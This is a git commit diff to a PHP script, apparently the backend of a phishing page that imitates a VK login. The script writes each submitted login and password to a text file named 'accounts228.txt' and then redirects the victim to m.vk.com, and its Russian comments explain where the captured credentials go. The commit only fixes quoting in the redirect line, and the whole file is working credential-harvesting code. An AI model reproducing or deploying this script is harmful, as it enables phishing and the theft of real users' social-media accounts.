4d725284b34ef4f28f02bf14f5709b6340ba6639
VK0ntakte <46567654+VK0ntakte@users.noreply.github.com>
2019-01-11 01:30:31 +0300

    Update skript.php

--- skript.php
+++ skript.php
@@ -6,5 +6,5 @@ $Pass = $_POST['pass'];
 $log = fopen("accounts228.txt","at"); //тут короче название куда будут сохрянться.txt
 fwrite($log,"$Log:$Pass\n");
 fclose($log);
-echo "<html><head><META HTTP-EQUIV="REFRESH" CONTENT="0; URL=https://m.vk.com"></head></html>"; //ТУТ КУДА ПЕРЕНАПРАВЛЯЕМ ПОСЛЕ ВХОДА!
+echo "<html><head><META HTTP-EQUIV='REFRESH' CONTENT='0; URL=https://m.vk.com'></head></html>"; //ТУТ КУДА ПЕРЕНАПРАВЛЯЕМ ПОСЛЕ ВХОДА!
 ?>
